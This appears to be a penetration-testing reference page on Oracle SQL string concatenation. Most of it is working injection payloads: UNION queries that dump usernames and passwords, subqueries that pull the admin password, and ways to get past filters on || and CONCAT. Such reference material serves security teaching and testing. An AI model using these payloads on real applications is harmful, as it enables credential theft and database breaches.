---
title: String Concatenation
description: Techniques for concatenating strings in Oracle SQL injection
category: Injection Techniques
order: 9
tags: ["concatenation", "string manipulation", "injection"]
lastUpdated: 2026-10-08
---

String concatenation plays a crucial role in crafting complex SQL injection payloads in Oracle databases. Understanding the various concatenation methods can help bypass filters and construct dynamic queries.

## Basic String Concatenation

Oracle provides multiple ways to concatenate strings:

| Method               | Description                                               | Example                                                          | Result   |
| -------------------- | --------------------------------------------------------- | ---------------------------------------------------------------- | -------- |
| Double pipe `\|\|`   | Standard SQL concatenation operator                       | `'ABC' \|\| 'DEF'`                                               | `ABCDEF` |
| `CONCAT()` function  | Two arguments before 23ai, any number from 23ai           | `CONCAT('ABC', 'DEF')`                                           | `ABCDEF` |
| `LISTAGG()` function | Aggregates rows with a separator (11g R2+)                | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)`                  | `A,B,C`  |
| `XMLAGG()` function  | Aggregates rows through XML (works before 11g R2 as well) | `XMLCAST(XMLAGG(XMLELEMENT(E, col \|\| ',')) AS VARCHAR2(4000))` | `A,B,C,` |

Unlike most databases, Oracle treats `NULL` as an empty string in concatenation: `'a' || NULL || 'b'` is `ab`, not `NULL`.

## Using Double Pipe Operator

The double pipe (`||`) is the most common concatenation method in Oracle:

```sql
-- Simple concatenation
SELECT 'Hello' || ' ' || 'World' FROM dual

-- Concatenating with columns
SELECT username || ' <' || email || '>' AS contact FROM users

-- Concatenating with functions
SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
```

## SQL Injection Examples

### Basic Concatenation Injection

In a string context, concatenation keeps the quotes balanced, so no comment is needed. The injected value replaces the original string, which is useful when the value is stored or displayed (for example in an `INSERT` or `UPDATE`):

```sql
-- Breaking out of quoted string
' || 'injected

-- Completing a valid expression
' || (SELECT password FROM users WHERE username='admin') || '

-- Injecting subqueries
' || (SELECT banner FROM v$version WHERE rownum=1) || '
```

### UNION Attack with Concatenation

The UNION examples on this page assume a two-column string query such as `SELECT username, email FROM users WHERE username = '<input>'`. Concatenation puts several values into one column:

```sql
-- UNION with concatenated columns
' UNION SELECT username || ':' || password, NULL FROM users--

-- UNION with concatenated results
' UNION SELECT 'Found: ' || LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--
```

## Advanced Concatenation Techniques

### Using CONCAT Function

The CONCAT function can be useful when the `||` operator is filtered:

```sql
-- Basic CONCAT usage
' UNION SELECT CONCAT('User: ', username), NULL FROM users--

-- Nested CONCAT (needed before 23ai, where CONCAT takes only two arguments)
' UNION SELECT CONCAT(CONCAT('ID:', id), CONCAT(':', password)), NULL FROM users--

-- 23ai and later only: any number of arguments (ORA-00909 on 21c and earlier)
' UNION SELECT CONCAT('ID:', id, ':', password), NULL FROM users--
```

### Using XMLAGG for Row Concatenation

XMLAGG concatenates values across multiple rows, also on versions without LISTAGG:

```sql
-- Concatenate all usernames into one row (11g+)
' UNION SELECT XMLCAST(XMLAGG(XMLELEMENT(E, username || ',')) AS VARCHAR2(4000)), NULL FROM users--

-- With ordering, older versions (EXTRACT is deprecated but still available)
' UNION SELECT RTRIM(XMLAGG(XMLELEMENT(E, username || ',') ORDER BY username).EXTRACT('//text()').GETSTRINGVAL(), ','), NULL FROM users--
```

`GETCLOBVAL()` returns a CLOB, which fails in a UNION with a `VARCHAR2` column (`ORA-01790`); use `GETSTRINGVAL()` or `XMLCAST(... AS VARCHAR2(4000))`. `EXTRACT('//text()')` leaves XML entities such as `&amp;` in the output; `XMLCAST` does not.

### Using LISTAGG for Row Concatenation (11g R2+)

```sql
-- Basic LISTAGG
' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--

-- LISTAGG with conditions
' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) || ' (Total: ' || COUNT(*) || ')', NULL FROM users WHERE username LIKE 'a%'--
```

## Bypassing Filters

### Bypassing Concatenation Filters

When `||` is filtered, use `CONCAT`. When both are filtered, `REPLACE` can insert one string into another:

```sql
-- CONCAT instead of ||
' UNION SELECT CONCAT(CHR(65), CHR(66)), NULL FROM dual--  -- 'AB'

-- REPLACE as concatenation: 'admin:' followed by the password
' UNION SELECT REPLACE('admin:~', '~', (SELECT password FROM users WHERE username='admin')), NULL FROM dual--
```

### Using TO_CHAR for Concatenation

`||` converts numbers and dates implicitly; `TO_CHAR` controls the format:

```sql
-- Converting non-string data for concatenation
' UNION SELECT 'ID:' || TO_CHAR(id), NULL FROM employees--

-- Date formatting with concatenation
' UNION SELECT 'Date: ' || TO_CHAR(SYSDATE, 'YYYY-MM-DD HH24:MI:SS'), NULL FROM dual--
```

## Handling Special Characters

```sql
-- Escaping quotes
' UNION SELECT 'Isn''t this interesting?', NULL FROM dual--

-- Using CHR() for special characters
' UNION SELECT 'Quote: ' || CHR(39) || ' Backslash: ' || CHR(92), NULL FROM dual--
```

## Multi-row Output Formatting

```sql
-- Formatting multi-row outputs
' UNION SELECT RPAD(username, 20) || ' | ' || password, NULL FROM users--

-- Creating table-like output
' UNION SELECT 'ID: ' || TO_CHAR(ROWNUM) || CHR(10) || 'User: ' || username || CHR(10) || 'Email: ' || email, NULL FROM users--
```

## Working with NULLs

Concatenating a `NULL` does not empty the result, but `NVL` makes missing values visible:

```sql
' UNION SELECT NVL(username, 'Anonymous') || ':' || NVL(email, 'No Email'), NULL FROM users--
```

## Performance Considerations

LISTAGG fails with `ORA-01489: result of string concatenation is too long` when the result exceeds the `VARCHAR2` limit (4000 bytes by default), so wrapping it in `SUBSTR` does not help. From 12c R2, `ON OVERFLOW TRUNCATE` cuts the list instead:

```sql
-- Truncate long lists instead of failing (12c R2+)
' UNION SELECT LISTAGG(username, ',' ON OVERFLOW TRUNCATE) WITHIN GROUP (ORDER BY username), NULL FROM users--

-- Older versions: page through the rows instead
' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users WHERE id BETWEEN 1 AND 100--
```
